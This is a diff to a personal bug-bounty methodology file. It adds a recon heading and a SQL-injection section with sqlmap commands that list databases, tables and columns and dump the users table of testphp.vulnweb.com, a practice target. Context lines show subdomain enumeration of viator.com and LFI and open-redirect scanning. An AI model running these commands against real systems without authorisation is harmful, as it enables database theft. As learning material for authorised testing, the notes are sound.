@@ -1,5 +1,7 @@
 <h1>My Bug Bounty Hunting Methodology</h1>
 
+<h1>Recon</h1>
+
 
 ```bash
 subfinder -d viator.com -all  -recursive > subdomain.txt
@@ -72,7 +74,23 @@ cat allurls.txt | gf lfi | nuclei -tags lfi
 ```bash
 cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
 ```
+<h1>Sqli</h1>
 
+```bash
+sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
+```
+
+```bash
+sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
+```
+
+```bash
+sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
+```
+
+```bash
+sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
+```
 
 
 
